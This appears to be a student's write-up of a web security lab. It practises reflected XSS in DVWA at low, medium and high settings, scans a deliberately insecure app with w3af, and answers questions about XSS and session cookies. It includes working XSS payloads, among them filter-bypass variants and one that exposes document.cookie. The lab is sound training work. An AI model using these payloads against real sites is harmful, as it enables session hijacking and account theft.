# Lab: XSS with w3af, DVWA

## Overview

XSS allows attackers to execute scripts in the victimâ€™s browser which can hijack user sessions, deface web sites, or redirect the user to malicious sites. Web Security Dojo allows us study XSS in action, then learn how web application vulnerability analysis can be automated using the open source scanning tool, w3af, to detect vulnerabilities like XSS.

> In 2019, 75% of large companies in Europe and North America were hit by XSS attacks. In the same year, XSS attacks comprised a whopping 40% of all cyber attacks! Turns out injecting malicious code into a web site is a favored attack technique by cyber criminals. We'd better learn a thing or two about it!

- admin / password

- Set DVWA Security to "Low"
![DVWA Security Low](media/lab36-1.png)

- Perform the following XSS (Reflected) exploits:
  - Have the site return your name as a larger font
  - `<script>document.write(`<h1>Andrew</h1>`);</script>`
  - ![DVWA XSS Reflected](media/lab36-2.png)

  - Have the site return your name in a different color
  - `<script>document.write('<span style="font-size: 24px; color: blue;">Andrew</span>');</script>`
  - ![DVWA XSS Reflected](media/lab36-3.png)

  - Have the site return your name in a popup box
  - `<script>alert('Andrew');</script>`
  - ![DVWA XSS Reflected](media/lab36-4.png)

- Set DVWA Security to "Medium"
- ![DVWA Security Medium](media/lab36-5.png)

- Perform the following XSS (Reflected) exploits:
  - Have the site return your name in a popup box
  - `<script>alert('Andrew');</script>`
  - `&lt;script&gt;alert(&#39;Andrew&#39;);&lt;/script&gt;`
  - ![DVWA XSS Reflected](media/lab36-5.png)

  - `<img src="x" onerror="alert('Anrew')" />`
  - ![DVWA XSS Reflected](media/lab36-6.png)
  - ![DVWA XSS Reflected](media/lab36-7.png)

    > Hint: How do you think the site is detecting your script command? Perhaps its defenses are not as "sensitive" as they seem! *well, it seems like there is some kind of input validation runnning in the code.  Enough to strip the script tags rendering the alert ineffective.*

  - Have the site return the session cookie in a popup box
  - `<img src="x" onerror="alert(document.cookie)" />`
  - ![DVWA XSS Reflected](media/lab36-8.png)

    > Hint: How did you get a popup box to appear last time?

If you are pursuing the stretch goal, set DVWA Security to "High" and try to get an alert popup in XSS (Reflected).
- `<svg/onload=alert('Andrew')>`

### Part 3: Evaluating InsecureWebApp with w3af

In this next part we will scan InsecureWebApp with w3af.

- Launch w3af (GUI version)
- Scan <http://insecure.local:8080/insecure/public/Login.jsp>
  - *As usual the lab instructions are vague trash.  The initial scan of http://insecure.local:8080/insecure/public/Login.jsp returned nothing because EVEN THOUGH A BLUE CHECKBOX WAS CLEARLY MARKED DIFFERENT FROM THE UNCHECKED BOXES THERE WAS NO INSTRUCTION IN THIS LAB TO ACTUALLY CHECK THAT BOX.*
  - **You must check the box CRAWL.  You must check the box for OUTPUT > CONSOLE.**

- Include a screenshot of the rendered response of the XSS vulnerability as discovered in w3af GUI that is associated with the "Forgot Login" page
  - **Where is this supposed to be?**

- Include a screenshot of the results of the web crawler.
  - ![w3af Crawler](media/lab36-10.png)

  - ![w3af Crawler](media/lab36-12.png)
  - ![w3af Crawler](media/lab36-13.png)

- After like 6 times running this super slow scan and not being able to replicate the results of my classmates I finally got the "expected output" so to speak.  Expected in that it sort of matches what others got.

### Part 4: Reporting

Answer the below prompts in your own words:

- **What is XSS, and why is it a security threat?**
  XSS, or Cross-Site Scripting, is a type of security vulnerability found in web applications. It occurs when attackers inject malicious scripts into web pages viewed by other users. These scripts can execute in the context of the victim's browser, allowing attackers to steal information, manipulate content, or perform other malicious actions. XSS is a significant security threat because it can lead to unauthorized access, data theft, and compromise of sensitive information.

- **What is a session cookie?**
  A session cookie is a small piece of data stored on the client-side (usually in the user's browser) by a web server. It is used to maintain session state and track a user's activity on a website during a browsing session. Session cookies typically contain a unique identifier that allows the server to recognize and associate the user with their session data.

- **How can a session cookie be abused by an attacker?**
  A session cookie can be abused by an attacker through various methods such as session hijacking or session fixation. In session hijacking, the attacker steals a user's session cookie, allowing them to impersonate the user and gain unauthorized access to the user's account or sensitive information. In session fixation, the attacker sets a known session ID in the user's browser, enabling them to predict the session ID and hijack the session once the user logs in. Additionally, if session cookies are not properly secured or encrypted, they can be intercepted and manipulated by attackers through techniques like packet sniffing or man-in-the-middle attacks.
